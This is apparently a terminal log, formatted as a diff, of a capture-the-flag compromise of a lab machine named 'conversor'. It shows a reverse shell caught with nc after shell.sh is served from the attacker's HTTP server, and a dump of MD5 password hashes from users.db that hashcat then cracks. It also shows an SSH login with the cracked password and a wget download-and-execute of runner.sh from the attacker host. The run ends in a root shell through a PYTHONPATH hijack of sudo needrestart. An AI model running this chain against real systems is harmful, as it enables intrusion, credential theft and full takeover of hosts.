@@ -1,0 +1,144 @@
+┌──(root㉿kali)-[/]
+└─# python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.11.92 - - [31/Oct/2025 10:47:58] "GET /shell.sh HTTP/1.1" 200 -
+
+
+┌──(root㉿kali)-[/]
+└─# rlwrap nc -lvnp 9001 
+listening on [any] 9001 ...
+connect to [10.10.16.8] from (UNKNOWN) [10.10.11.92] 35994
+bash: cannot set terminal process group (94832): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@conversor:~$
+
+www-data@conversor:~$ cd conversor.htb/instance
+
+www-data@conversor:~/conversor.htb/instance$ ls -l
+ls -l
+total 24
+-rwxr-x--- 1 www-data www-data 24576 Oct 31 15:49 users.db
+
+www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db
+sqlite3 users.db
+SQLite version 3.37.2 2022-01-06 13:25:41
+Enter ".help" for usage hints.
+sqlite> .tables
+.tables
+files  users
+
+sqlite> SELECT * FROM users
+SELECT * FROM users;
+
+1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
+5|test|5f4dcc3b5aa765d61d8327deb882cf99
+6|sam|332532dcfaa1cbf61e2a266bd723612c
+7|root|5f4dcc3b5aa765d61d8327deb882cf99
+8|tester123|098f6bcd4621d373cade4e832627b4f6
+9|1234|81dc9bdb52d04dc20036dbd8313ed055
+
+┌──(root㉿kali)-[/]
+└─# hashcat -m 0 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt
+
+┌──(root㉿kali)-[/]
+└─# cat cracked.txt   
+5b5c3ac3a1c897c94caad48e6c71fdec:(passwordwillbehere)
+
+┌──(root㉿kali)-[/]
+└─# ssh fismathack@10.10.11.92
+fismathack@10.10.11.92's password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-160-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Fri Oct 31 04:31:11 PM UTC 2025
+
+  System load:  1.0               Processes:             287
+  Usage of /:   79.0% of 5.78GB   Users logged in:       0
+  Memory usage: 19%               IPv4 address for eth0: 10.10.11.92
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Fri Oct 31 16:31:12 2025 from 10.10.16.8
+fismathack@conversor:~$ 
+
+fismathack@conversor:/var$ sudo -l
+Matching Defaults entries for fismathack on conversor:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User fismathack may run the following commands on conversor:
+    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
+
+
+
+
+
+
+
+fismathack@conversor:/tmp$ wget http://10.10.16.8:8000/runner.sh
+--2025-11-03 01:31:55--  http://10.10.16.8:8000/runner.sh
+Connecting to 10.10.16.8:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 451 [application/x-sh]
+Saving to: ‘runner.sh’
+
+runner.sh                        100%[=========================================================>]     451  --.-KB/s    in 0s      
+
+2025-11-03 01:31:55 (22.8 MB/s) - ‘runner.sh’ saved [451/451]
+
+fismathack@conversor:/tmp$ chmod +x runner.sh
+fismathack@conversor:/tmp$ ./runner.sh
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 15520  100 15520    0     0   154k      0 --:--:-- --:--:-- --:--:--  156k
+Bait process is running. Trigger 'sudo /usr/sbin/needrestart' in another shell.
+fismathack@conversor:/tmp$ cd malicious
+fismathack@conversor:/tmp/malicious$ export PYTHONPATH="/tmp/malicious"
+fismathack@conversor:/tmp/malicious$ python3 e.py
+
+fismathack@conversor:~$ sudo /usr/sbin/needrestart
+Scanning processes...                                                           
+Scanning linux images...                                                        
+
+Running kernel seems to be up-to-date.
+
+No services need to be restarted.
+
+No containers need to be restarted.
+
+No user sessions are running outdated binaries.
+
+No VM guests are running outdated hypervisor (qemu) binaries on this host.
+
+
+Shell received
+# 
+# cd /root
+# ls
+root.txt  scripts
+# cat root.txt
+13b093eb27181950bb6c28a49b16ad46
+# 
